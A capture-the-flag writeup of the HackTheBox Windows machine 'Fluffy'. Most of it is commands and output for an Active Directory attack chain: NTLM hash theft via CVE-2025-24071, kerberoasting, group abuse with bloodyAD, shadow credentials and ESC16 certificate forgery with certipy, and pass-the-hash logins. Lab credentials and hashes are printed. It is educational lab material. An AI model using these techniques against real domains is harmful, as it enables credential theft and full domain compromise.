---
title: 'HackTheBox | Fluffy'
published: 2026-09-27
draft: false
description: 'HackTheBox Machine `Fluffy` writeup.'
tags: ['HackTheBox', 'windows', 'active-directory', 'AD CS']
---

Fluffy was an easy rated, assumed breach machine on HackTheBox. It involves exploiting `CVE-2025-24071`, a vulnerability in Windows File Explorer that leaks NTLM credentials when a malicious `.library-ms` file is extracted from an archive. It gets us the NTLMv2 hash of another user which we are able to successfully crack it. From there, the bloodhound data shows this new user is a member of `Service Account Managers` group which gives its members `GenericAll` over the `Service Accounts` group. We can use this access control right to add any user to the `Service Accounts` group. Next, members of `Service Accounts` group have `GenericWrite` over a couple of service accounts, one of them is `ca_svc` (Certificate Authority Service Account). At last, we can exploit the `ESC16` ADCS mis-configuration to get a shell as `Administrator`.

## Port Scan

We start from a TCP port scan of all ports, and then a version scan and scripts scan of the open ports.

```
# Nmap 7.95 scan initiated Sat Sep 26 09:32:06 2026 as: nmap -sC -sV -p53,88,139,389,445,464,593,636,3268,3269,5985,9389,49668,49689,49690,49711,49724 -Pn -n -vv -oN nmap/tcp_deep 10.129.232.88
Nmap scan report for 10.129.232.88
Host is up, received user-set (0.25s latency).
Scanned at 2026-09-26 09:32:06 EDT for 104s

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2026-09-26 20:31:17Z)
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-09-26T20:32:52+00:00; +6h59m04s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-30T16:09:59
| Not valid after:  2106-04-30T16:09:59
| MD5:   f5e3:ec00:5fd1:2a95:a76b:2fd6:4726:4d67
| SHA-1: 6867:9230:5123:dcf1:9352:e081:4148:7fef:13c7:6c0a
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-30T16:09:59
| Not valid after:  2106-04-30T16:09:59
| MD5:   f5e3:ec00:5fd1:2a95:a76b:2fd6:4726:4d67
| SHA-1: 6867:9230:5123:dcf1:9352:e081:4148:7fef:13c7:6c0a
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: 2026-09-26T20:32:52+00:00; +6h59m04s from scanner time.
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-09-26T20:32:52+00:00; +6h59m04s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-30T16:09:59
| Not valid after:  2106-04-30T16:09:59
| MD5:   f5e3:ec00:5fd1:2a95:a76b:2fd6:4726:4d67
| SHA-1: 6867:9230:5123:dcf1:9352:e081:4148:7fef:13c7:6c0a
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-30T16:09:59
| Not valid after:  2106-04-30T16:09:59
| MD5:   f5e3:ec00:5fd1:2a95:a76b:2fd6:4726:4d67
| SHA-1: 6867:9230:5123:dcf1:9352:e081:4148:7fef:13c7:6c0a
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: 2026-09-26T20:32:52+00:00; +6h59m04s from scanner time.
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack Microsoft Windows RPC
49711/tcp open  msrpc         syn-ack Microsoft Windows RPC
49724/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 44288/tcp): CLEAN (Timeout)
|   Check 2 (port 38178/tcp): CLEAN (Timeout)
|   Check 3 (port 35164/udp): CLEAN (Timeout)
|   Check 4 (port 29958/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-09-26T20:32:13
|_  start_date: N/A
|_clock-skew: mean: 6h59m03s, deviation: 0s, median: 6h59m03s
```

- General ports associated with the Windows Domain Controller are active, including SMB, ldap and winrm.
- The Certificate Authority's name is **`FLUFFY-DC01-CA`**
- The domain name is `fluffy.htb`

Before moving further, I will sync my system's clock to the domain controller and also add this domain to my `hosts` file

```shell
$ sudo ntpdate 10.129.232.88
```

```shell
$ nxc smb 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --generate-hosts-file hosts.txt
$ cat hosts.txt | tee -a /etc/hosts
```

---

## Initial Enumeration

I will use `nxc` to enumerate basic information about the domain, including all the users and groups and **if any credentials are left in these users's or groups's descriptions fields.** I found nothing.

### Kerberoasting

I'll start from kerberoasting to see if we can pivot to any other user. It gets me hashes for 3 service accounts on the domain, none of the which are crackable.

```shell
$ nxc ldap $IP -u j.fleischman -p 'J0elTHEM4n1990!' --kerberoasting hashes.krbrst
LDAP        10.129.232.88   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:None) (channel binding:Never)
LDAP        10.129.232.88   389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
LDAP        10.129.232.88   389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.129.232.88   389    DC01             [*] Total of records returned 3
LDAP        10.129.232.88   389    DC01             [*] sAMAccountName: ca_svc, memberOf: ['CN=Service Accounts,CN=Users,DC=fluffy,DC=htb', 'CN=Cert Publishers,CN=Users,DC=fluffy,DC=htb'], pwdLastSet: 2025-04-17 12:07:50.136701, lastLogon: 2026-09-26 21:22:40.694955
LDAP        10.129.232.88   389    DC01             $krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb\ca_svc*$<snip>
LDAP        10.129.232.88   389    DC01             [*] sAMAccountName: ldap_svc, memberOf: CN=Service Accounts,CN=Users,DC=fluffy,DC=htb, pwdLastSet: 2025-04-17 12:17:00.599545, lastLogon: <never>
LDAP        10.129.232.88   389    DC01             $krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb\ldap_svc*$<snip>
LDAP        10.129.232.88   389    DC01             [*] sAMAccountName: winrm_svc, memberOf: ['CN=Service Accounts,CN=Users,DC=fluffy,DC=htb', 'CN=Remote Management Users,CN=Builtin,DC=fluffy,DC=htb'], pwdLastSet: 2025-05-17 20:51:16.786913, lastLogon: 2026-09-26 21:23:31.804325
LDAP        10.129.232.88   389    DC01             $krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb\winrm_svc*$<snip>
```

### SMB Shares

Our user `j.fleischman` has `READ` and `WRITE` access to a share on the domain controller named `IT`. It has a bunch of files.

```shell
$ smbclient -U 'fluffy.htb\j.fleischman%J0elTHEM4n1990!' //$IP/IT
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Sep 27 12:52:30 2026
  ..                                  D        0  Sun Sep 27 12:52:30 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A      326  Sat Sep 26 20:29:33 2026
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

		5842943 blocks of size 4096. 2220833 blocks available
```

Among these, `Upgrade_Notice.pdf` highlights a couple of CVEs to which the current environment is vulnerable to. These include :
![[Pasted image 20260927152730.png]]

Viewing this pdf's metadata shows the `author` is the user `p.agila`

---

## Exploiting CVE-2025-24071

Among all the mentioned CVEs, CVE-2025-24071 seems the most simple to exploit. It involves creating an archive with a _malicious_ `.library-ms` file that points to the attacker's server. When a user extract this archive in Windows File Explorer, it automatically parses the `.library-ms` file and sends the user's NTLM hash to the mentioned IP address in the malicious file.

I'll use this PoC from `[exploitdb](https://www.exploit-db.com/exploits/52310)` to create a zip file and upload it to the `IT` share. Before that, I will also start `Responder` on my machine to listen for incoming requests.

In less than 2 minutes, I'll receive the hash of the `p.agila` user.

```
p.agila::FLUFFY:9c48ffd93d2ad062:14591F5898FD807F03D9D0CBECFE3E1D:010100000000000080ECE87FDF4DDD0126F5FC73F11C0D5900000000020008005300480056004A0001001E00570049004E002D00340048005A004F00520037005300530033005A004B0004003400570049004E002D00340048005A004F00520037005300530033005A004B002E005300480056004A002E004C004F00430041004C00030014005300480056004A002E004C004F00430041004C00050014005300480056004A002E004C004F00430041004C000700080080ECE87FDF4DDD0106000400020000000800300030000000000000000100000000200000AD83B32845D2BFE8F5B8ECE69E591352E49C3B164ACA37A34B6ACA0850AAC4DF0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00350031000000000000000000
```

Next, I can crack this hash and get this user's password, which is `prometheusx-303`

---

## Bloodhound Enumeration

I'll use `nxc` to gather the data to ingest in bloodhound.

```shell
$ nxc ldap $IP -u j.fleischman -p 'J0elTHEM4n1990!' --bloodhound -c all --dns-server $IP
```

After ingesting this data into bloodhound, I will mark the 2 users I have access to as `owned`. `j.fleischman` and `p.agila`

From this point, bloodhound easily maps the path.

- User `p.agila` is a member of the group `Service Account Managers`.
- This group members have `GenericAll` over another group `Service Accounts`.
- Members of the `Service Accounts` group has `GenericWrite` over the service accounts :
  - `ca_svc`
  - `ldap_svc`
  - `winrm_svc`
- `winrm_svc` is a member of `Remote Management Users` group, thus has access to log in through `winrm`

---

## Shell as `winrm_svc`

### Adding a user to the `Service Accounts` group

I'll use `bloodyAD` to authenticate as `p.agila` and add the user `j.fleischman` to the `Service Accounts` group.

```shell
$ bloodyAD -u p.agila -p 'prometheusx-303' -d fluffy.htb --host $IP add groupMember "Service Accounts" "j.fleischman"
[+] j.fleischman added to Service Accounts
```

### Shadow Credential Attack on `winrm_svc` user

- The Targeted Krberoast attack won't work as we were not able to crack these users' password, and I do not wish to change their passwords, so we will perform a Shadow Credentials attack on this user, using `certipy`

```shell
$ certipy shadow auto -account winrm_svc -dc-ip $IP -dc-host DC01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'dc831f1dbf5e43088c9910a51508c66e'
[*] Adding Key Credential with device ID 'dc831f1dbf5e43088c9910a51508c66e' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'dc831f1dbf5e43088c9910a51508c66e' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
File 'winrm_svc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

- It retrieves the NT hash for the `winrm_svc` user and we can use this to log in using `evil-winrm` and get the **User Flag**.

```shell
$ evil-winrm -i $IP -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
<SNIP>
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> type ..\Desktop\user.txt
38200a1b8da5********************
*Evil-WinRM* PS C:\Users\winrm_svc\Documents>
```

---

## Shell as `Administrator`

### Shadow Credentials Attack on `ca_svc` user

- I'll use the same membership to perform a shadow credentials attack on the `ca_svc` user and get his NT hash
- `CA_SVS@FLUFFY.HTB` is a High privileged user, who is a member of the `Cert Publishers` group, the group that permits its members to publish certificates to the directory

### Finding misconfigurating in AD CS

- I'll use this user's hash with `certipy` to look for vulnerable templates
-

```shell
$ certipy find -dc-ip $IP -dc-host DC01.fluffy.htb -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8  -vulnerable -stdout
<SNIP>
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3150FA7E60CE28AD4DAE41A1B61D8874
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:12:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
                                          FLUFFY.HTB\Administrators
        Read                            : FLUFFY.HTB\Administrators
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

- The output shows the ESC16 misconfiguration i.e. `Security Extension is disabled`.

### Exploiting ESC16

#### Changing `ca_svc` upn to `administrator`

```shell
$ certipy account -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -target fluffy.htb -user 'ca_svc' -upn 'administrator' update -dc-ip $IP
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

#### Request Certificate

Now, with the changed UserPrincipalName (upn), I need to request a certificate as `ca_svc` with the upn set to `administrator`

```shell
$ certipy-ad req -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -ca fluffy-DC01-CA -upn administrator -dc-ip 10.129.232.88 -template 'User'
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 27
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'
```

#### Reverting `ca_svc` upn

Now that I have administrator's certificate, I can authenticate with it and get its NT Hash, but before that I have to revert `ca_svc` upn back to anything other than `administrator`, else it will error out the following :

```shell
$ certipy auth -pfx administrator.pfx -username administrator -domain fluffy.htb -dc-ip $IP
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[-] Name mismatch between certificate and user 'administrator'
[-] Verify that the username 'administrator' matches the certificate UPN: administrator
[-] See the wiki for more information
```

**Reverting back**

```shell
$ certipy account -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -target fluffy.htb -user 'ca_svc' -upn 'ca_svc@fluffy.htb' update -dc-ip $IP
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

#### Retrieving Administrator's Hash

```shell
$ certipy auth -pfx administrator.pfx -username administrator -domain fluffy.htb -dc-ip $IP
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

With the retrieved hash, I can log in (winrm) as `Administrator` and get the **Root Flag**.

```shell
$ evil-winrm -i $IP -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
<SNIP>
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
34f17451103635b*****************
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
